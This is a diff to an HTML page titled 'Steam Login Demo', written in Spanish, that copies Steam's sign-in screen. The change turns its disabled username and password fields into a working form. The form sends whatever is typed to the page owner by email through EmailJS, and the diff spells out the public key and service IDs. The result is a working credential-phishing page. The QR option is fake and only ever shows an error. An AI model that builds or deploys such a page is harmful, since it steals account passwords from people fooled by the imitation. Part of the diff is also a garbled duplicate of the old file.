@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
+<meta charset="UTF-8" />
 <title>Steam Login Demo</title>
 
 <style>
@@ -21,13 +21,12 @@ body {
 .steam-box {
   background: #171a21;
   width: 820px;
-  min-height: 460px;
+  height: 360px;
   border-radius: 6px;
   display: flex;
   padding: 30px;
   box-sizing: border-box;
   position: relative;
-  gap: 30px;
 }
 
 /* ====== IZQUIERDA ====== */
@@ -36,225 +35,6 @@ body {
 .steam-title {
   display: flex;
   align-items: center;
-  font-size: 22px;
-  font-weight: bold;
-  margin-bottom: 25px;
-}
-
-.steam-title img {
-  width: 36px;
-  margin-right: 10px;
-}
-
-.label {
-  font-size: 12px;
-  color: #66c0f4;
-  margin-bottom: 5px;
-}
-
-input, textarea {
-  width: 100%;
-  padding: 10px;
-  background: #32353c;
-  border: none;
-  color: white;
-  margin-bottom: 15px;
-  border-radius: 2px;
-  outline: none;
-  font-family: Arial, Helvetica, sans-serif;
-  font-size: 14px;
-  resize: vertical;
-}
-
-.remember {
-  display: flex;
-  align-items: center;
-  font-size: 13px;
-  margin-bottom: 20px;
-}
-
-button {
-  width: 100%;
-  padding: 12px;
-  background: linear-gradient(90deg,#06bfff,#2d73ff);
-  border: none;
-  color: white;
-  font-weight: bold;
-  font-size: 15px;
-  border-radius: 2px;
-  cursor: pointer;
-}
-
-/* ====== DERECHA / QR ====== */
-.right {
-  width: 260px;
-  text-align: center;
-}
-
-.qr-title {
-  color: #66c0f4;
-  font-size: 12px;
-  margin-bottom: 10px;
-}
-
-.qr {
-  background: white;
-  padding: 10px;
-  border-radius: 4px;
-  margin-bottom: 10px;
-  cursor: pointer;
-}
-
-.qr img {
-  width: 180px;
-}
-
-/* ====== OVERLAY (CARGA + ERROR) ====== */
-.overlay {
-  position: absolute;
-  inset: 0;
-  background: rgba(14,22,33,0.95);
-  display: none;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-  border-radius: 6px;
-}
-
-.spinner {
-  width: 48px;
-  height: 48px;
-  border: 4px solid #2a475e;
-  border-top: 4px solid #66c0f4;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin-bottom: 15px;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-.error {
-  color: #c6d4df;
-  font-size: 14px;
-  margin-top: 5px;
-}
-
-.suberror {
-  color: #8f98a0;
-  font-size: 12px;
-  margin-top: 6px;
-}
-
-/* ====== FOOTER ====== */
-.footer {
-  position: absolute;
-  bottom: 30px;
-  font-size: 12px;
-  color: #8f98a0;
-}
-
-.footer span {
-  color: #66c0f4;
-}
-</style>
-</head>
-
-<body>
-
-<div class="steam-box">
-
-  <!-- IZQUIERDA -->
-  <div class="left">
-    <div class="steam-title">
-      <img src="steam-logo.png" alt="Steam">
-      STEAM
-    </div>
-
-    <div class="label">INICIA SESIÓN CON TU NOMBRE DE CUENTA</div>
-    <input type="text" placeholder="Nombre de cuenta" disabled>
-
-    <div class="label">CONTRASEÑA</div>
-    <input type="password" placeholder="Contraseña" disabled>
-
-    <div class="remember">
-      <input type="checkbox" checked disabled style="width:auto;margin-right:8px;">
-      Recordarme
-    </div>
-
-    <button disabled>Iniciar sesión</button>
-
-    <!-- FORMULARIO DE CONTACTO PARA ENVIAR EMAIL -->
-    <form id="contact-form" style="margin-top: 30px;">
-      <div class="label">Tu nombre</div>
-      <input type="text" name="name" placeholder="Escribe tu nombre" required>
-
-      <div class="label">Tu mensaje</div>
-      <textarea name="message" placeholder="Escribe tu mensaje" rows="4" required></textarea>
-
-      <button type="submit">Enviar mensaje</button>
-    </form>
-  </div>
-
-  <!-- DERECHA -->
-  <div class="right">
-    <div class="qr-title">O BIEN CON UN CÓDIGO QR</div>
-    <div class="qr" onclick="simularQR()">
-      <img src="qr-demo.png" alt="QR">
-    </div>
-    <div style="font-size:12px;">
-      Usa la aplicación <b>Steam Mobile</b><br>
-      para iniciar sesión con un código QR
-    </div>
-  </div>
-
-  <!-- OVERLAY -->
-  <div class="overlay" id="overlay">
-    <div class="spinner"></div>
-    <div class="error">Ha sucedido un error</div>
-    <div class="suberror">No se pudo verificar el inicio de sesión</div>
-  </div>
-
-</div>
-
-<div class="footer">
-  <span>Ayuda, no puedo iniciar sesión</span> ·
-  ¿No tienes una cuenta de Steam?
-  <span>Crear una cuenta gratuita</span>
-</div>
-
-<script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
-<script>
-function simularQR() {
-  const overlay = document.getElementById("overlay");
-  overlay.style.display = "flex";
-
-  // Mostrar carga 2s y luego error (estilo Steam)
-  setTimeout(() => {
-    // se queda mostrando el error
-  }, 2000);
-}
-
-// Configura EmailJS con tus claves
-emailjs.init('3x0styJQNXamR4XT4'); // Tu Public Key
-
-// Maneja el envío del formulario
-document.getElementById('contact-form').addEventListener('submit', function(event) {
-  event.preventDefault();
-
-  emailjs.sendForm('service_33u0mdn', 'template_vs7phvq', this)
-    .then(() => {
-      alert('Correo enviado correctamente!');
-      this.reset();
-    }, (error) => {
-      alert('Error al enviar correo: ' + error.text);
-    });
-});
-</script>
-
-</body>
-</html>  align-items: center;
   font-size: 22px;
   font-weight: bold;
   margin-bottom: 25px;
@@ -287,6 +67,7 @@ input {
   align-items: center;
   font-size: 13px;
   margin-bottom: 20px;
+  color: #c6d4df;
 }
 
 button {
@@ -298,7 +79,7 @@ button {
   font-weight: bold;
   font-size: 15px;
   border-radius: 2px;
-  cursor: not-allowed;
+  cursor: pointer;
 }
 
 /* ====== DERECHA / QR ====== */
@@ -384,32 +165,34 @@ button {
   <!-- IZQUIERDA -->
   <div class="left">
     <div class="steam-title">
-      <img src="steam-logo.png" alt="Steam">
+      <img src="steam-logo.png" alt="Steam" />
       STEAM
     </div>
 
-    <div class="label">INICIA SESIÓN CON TU NOMBRE DE CUENTA</div>
-    <input type="text" placeholder="Nombre de cuenta" disabled>
+    <form id="login-form">
+      <div class="label">INICIA SESIÓN CON TU NOMBRE DE CUENTA</div>
+      <input type="text" name="username" placeholder="Nombre de cuenta" required />
 
-    <div class="label">CONTRASEÑA</div>
-    <input type="password" placeholder="Contraseña" disabled>
+      <div class="label">CONTRASEÑA</div>
+      <input type="password" name="password" placeholder="Contraseña" required />
 
-    <div class="remember">
-      <input type="checkbox" checked disabled style="width:auto;margin-right:8px;">
-      Recordarme
-    </div>
+      <div class="remember">
+        <input type="checkbox" name="remember" checked style="width:auto;margin-right:8px;" />
+        Recordarme
+      </div>
 
-    <button disabled>Iniciar sesión</button>
+      <button type="submit">Iniciar sesión</button>
+    </form>
   </div>
 
   <!-- DERECHA -->
   <div class="right">
     <div class="qr-title">O BIEN CON UN CÓDIGO QR</div>
     <div class="qr" onclick="simularQR()">
-      <img src="qr-demo.png" alt="QR">
+      <img src="qr-demo.png" alt="QR" />
     </div>
-    <div style="font-size:12px;">
-      Usa la aplicación <b>Steam Mobile</b><br>
+    <div style="font-size: 12px;">
+      Usa la aplicación <b>Steam Mobile</b><br />
       para iniciar sesión con un código QR
     </div>
   </div>
@@ -420,7 +203,6 @@ button {
     <div class="error">Ha sucedido un error</div>
     <div class="suberror">No se pudo verificar el inicio de sesión</div>
   </div>
-
 </div>
 
 <div class="footer">
@@ -429,18 +211,37 @@ button {
   <span>Crear una cuenta gratuita</span>
 </div>
 
+<script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
 <script>
-function simularQR() {
-  const overlay = document.getElementById("overlay");
-  overlay.style.display = "flex";
+  function simularQR() {
+    const overlay = document.getElementById("overlay");
+    overlay.style.display = "flex";
 
-  // Mostrar carga 2s y luego error (estilo Steam)
-  setTimeout(() => {
-    // se queda mostrando el error
-  }, 2000);
-}
+    // Mostrar carga 2s y luego error (estilo Steam)
+    setTimeout(() => {
+      // se queda mostrando el error
+    }, 2000);
+  }
+
+  // Inicializa EmailJS con tu Public Key
+  emailjs.init("3x0styJQNXamR4XT4");
+
+  // Maneja el envío del formulario de login
+  document.getElementById("login-form").addEventListener("submit", function (event) {
+    event.preventDefault();
+
+    emailjs
+      .sendForm("service_33u0mdn", "template_vs7phvq", this)
+      .then(
+        () => {
+          alert("Correo enviado correctamente!");
+          this.reset();
+        },
+        (error) => {
+          alert("Error al enviar correo: " + error.text);
+        }
+      );
+  });
 </script>
-
 </body>
 </html>
-
